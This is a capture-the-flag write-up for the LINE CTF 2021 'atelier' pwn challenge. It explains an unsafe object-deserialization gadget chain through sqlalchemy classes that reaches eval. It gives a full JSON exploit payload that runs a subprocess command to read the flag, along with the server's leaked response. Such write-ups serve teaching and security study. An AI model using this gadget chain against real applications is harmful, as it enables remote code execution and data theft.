# LINE CTF 2021 - Pwn - atelier

By using `dict_to_object`, we can create a class of any importable module and set its members.
However, it seems that the importable modules are limited to `__main__` and `sqlalchemy`.

We can implement the method by creating an object of the class that has the `__call__` method and setting it to the attribute.
When the `sqlalchemy.Text` class is used in a query, the `self_group` method is called, so we can execute any `__call__` method with matching arguments.

To start the shell 
we can use `sqlalchemy.ext.declarative.clsregistry._class_resolver`, whose  ` __call__` method calls `eval` and the arguments are manipulable.

We can't see the standard output, so raise an exception that includes the output we want in the string.

## Exploit Code

```json
{"__class__": "RecipeCreateRequest", "__module__": "__main__", "materials": {"__class__": "RecipeCreateRequest", "__module__": "__main__", "split": {"__class__": "BooleanPredicate", "__module__": "sqlalchemy.testing.exclusions", "value": [{"__class__": "Text", "__module__": "sqlalchemy", "self_group": {"__class__": "scoped_session", "__module__": "sqlalchemy.orm.scoping", "registry": {"__class__": "RecipeCreateRequest", "__module__": "__main__", "has": {"__class__": "_class_resolver", "__module__": "sqlalchemy.ext.declarative.clsregistry", "arg": "eval(\"!\" + str(__import__(\"subprocess\").run([\"cat\", \"flag\"],stdout=-1).stdout))", "_dict": {}}, "set": {"__class__": "BooleanPredicate", "__module__": "sqlalchemy.testing.exclusions", "value": 1}}}}, ""]}}}
```

server response:

```Exception: SyntaxError('invalid syntax', ('<string>', 1, 1, "!b'LINECTF{4t3l13r_Pyza_th3_4lch3m1st_0f_PyWN}\\n'"))```